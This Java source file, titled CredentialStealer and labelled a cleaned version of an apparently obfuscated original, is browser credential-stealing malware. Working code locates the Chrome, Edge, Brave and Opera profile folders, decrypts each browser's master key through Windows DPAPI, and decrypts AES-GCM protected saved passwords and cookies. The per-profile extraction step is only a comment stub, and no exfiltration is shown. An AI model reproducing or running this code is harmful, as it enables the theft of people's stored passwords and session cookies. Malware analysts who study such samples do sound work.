import com.sun.jna.platform.win32.Crypt32;
import com.sun.jna.platform.win32.WinCrypt;
import java.io.File;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Base64;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import javax.crypto.Cipher;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import org.json.JSONObject;

/**
 * Cleaned CredentialStealer (formerly u.java)
 * Core logic for extracting browser credentials, cookies, and DPAPI protected data.
 */
public class CredentialStealer {
    private static final Map<String, String> BROWSER_PATHS = new HashMap<>();

    static {
        BROWSER_PATHS.put("chrome", "Google\\Chrome\\User Data");
        BROWSER_PATHS.put("edge", "Microsoft\\Edge\\User Data");
        BROWSER_PATHS.put("brave", "BraveSoftware\\Brave-Browser\\User Data");
        BROWSER_PATHS.put("opera", "Opera Software\\Opera Stable");
    }

    /**
     * Decrypts browser master key using Windows DPAPI.
     */
    public static byte[] getMasterKey(File localStateFile) {
        try {
            if (!localStateFile.exists()) return null;
            
            String content = Files.readString(localStateFile.toPath());
            JSONObject json = new JSONObject(content);
            String encryptedKeyBase64 = json.getJSONObject("os_crypt").getString("encrypted_key");
            
            byte[] encryptedKeyWithPrefix = Base64.getDecoder().decode(encryptedKeyBase64);
            byte[] encryptedKey = Arrays.copyOfRange(encryptedKeyWithPrefix, 5, encryptedKeyWithPrefix.length);
            
            return decryptWithDPAPI(encryptedKey);
        } catch (Exception e) {
            return null;
        }
    }

    private static byte[] decryptWithDPAPI(byte[] encryptedData) {
        WinCrypt.DATA_BLOB input = new WinCrypt.DATA_BLOB(encryptedData);
        WinCrypt.DATA_BLOB output = new WinCrypt.DATA_BLOB();
        
        if (Crypt32.INSTANCE.CryptUnprotectData(input, null, null, null, null, 0, output)) {
            return output.getData();
        }
        return null;
    }

    /**
     * Decrypts AES-GCM encrypted browser data (Passwords/Cookies).
     */
    public static String decryptAES(byte[] encryptedData, byte[] masterKey) {
        try {
            if (encryptedData == null || masterKey == null || encryptedData.length < 15) return "";
            
            // Chrome v80+ uses 'v10' or 'v11' prefix
            byte[] iv = Arrays.copyOfRange(encryptedData, 3, 15);
            byte[] payload = Arrays.copyOfRange(encryptedData, 15, encryptedData.length);
            
            Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
            SecretKeySpec spec = new SecretKeySpec(masterKey, "AES");
            cipher.init(Cipher.DECRYPT_MODE, spec, new GCMParameterSpec(128, iv));
            
            return new String(cipher.doFinal(payload), StandardCharsets.UTF_8);
        } catch (Exception e) {
            return "";
        }
    }

    /**
     * Scans and collects credentials from all supported browsers.
     */
    public static void runAll() {
        String appData = System.getenv("LOCALAPPDATA");
        for (Map.Entry<String, String> browser : BROWSER_PATHS.entrySet()) {
            File userDataDir = new File(appData, browser.getValue());
            if (userDataDir.exists()) {
                processBrowser(browser.getKey(), userDataDir);
            }
        }
    }

    private static void processBrowser(String name, File userDataDir) {
        File localState = new File(userDataDir, "Local State");
        byte[] masterKey = getMasterKey(localState);
        
        if (masterKey != null) {
            // Logic to iterate through Profiles (Default, Profile 1, etc.)
            // and extract Login Data, Cookies, Web Data...
        }
    }
}
